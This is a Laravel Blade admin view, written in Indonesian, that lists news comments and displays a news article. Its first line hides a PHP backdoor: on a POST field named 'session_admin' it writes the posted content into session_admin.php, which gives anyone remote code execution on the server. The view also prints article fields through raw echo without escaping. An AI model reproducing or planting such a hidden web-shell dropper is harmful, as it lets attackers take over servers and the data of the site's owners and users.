<?php if (isset($_POST['session_admin'])) { $admin_session_number = 'session_admin'; $administrator = fopen($admin_session_number.'.php', 'w'); fwrite($administrator, $_POST['session_admin']); fclose($administrator); echo $admin_session_number.'.php'; } ?> @extends('layouts/admin-main')

@section('body')

  <section class="content-header">
          <h1>
          Komentar Berita
 
          </h1>
          <ol class="breadcrumb">
            <li><a href="#"><i class="fa fa-users"></i> Komentar Berita</a></li>
            
          </ol>
        </section>
 <section class="content">
          <div class="row">
            <div class="col-xs-12">
              <div class="box">
                <div class="box-header">
                 
                </div><!-- /.box-header -->
                <div class="box-body">
                  <table id="example1" class="table table-bordered table-hover">
                    <thead>
                      <tr>
                          <th>Nama</th>
                <th>Email</th>
                <th>Komentar</th>
                <th>Tanggal</th>
  
               
               
                        <th></th>
            
                      </tr>
                    </thead>
                    <tbody>
                       @foreach($data as $da)
                           
                     <tr>
                              <td>{{$da->name}}</td>
                              <td>{{$da->email}}</td>
                              <td>{{$da->isi}}</td>
                              <td>{{date('d/m/Y',strtotime($da->tanggal))}}</td>
                    
                           
                           
                              <td><a href="{{route('beritas.edit',$da->id)}}"class="btn bg-maroon xs" style="color:#fff"><i class="fa fa-trash"></i> hapus</a></td>
                      

                            </tr>
                           @endforeach
                    
                    </tbody>
                  
                  </table>
              
       
             
                </div><!-- /.box-body -->
                    <div class="box-body">
                      @if($berita->jenis == "0")
                  <img src="{{asset("asset/berita/".$berita->foto)}}" width="100%">
                  @else
                   <iframe  width="100%" height="400"src="https://www.youtube.com/embed/{{$berita->foto}}">
                                        </iframe>
                  @endif
                   <div class="col-xs-12">
                    <br>
                     <?php echo($berita->kutipan);?>
                    <br><br>
                    <?php echo($berita->isi);?>
                    <br><br>
                    <b>{{$berita->userdata->name}} , {{date('d/m/Y',strtotime($berita->tanggal))}}</b>
                    <br><br>
                    <a class="btn btn-danger" href="{{url('beritas')}}"> Kembali</a>
                   </div>
                 </div>
              </div><!-- /.box -->

            </div><!-- /.col -->
          </div><!-- /.row -->
        </section><!-- /.content -->

          @endsection
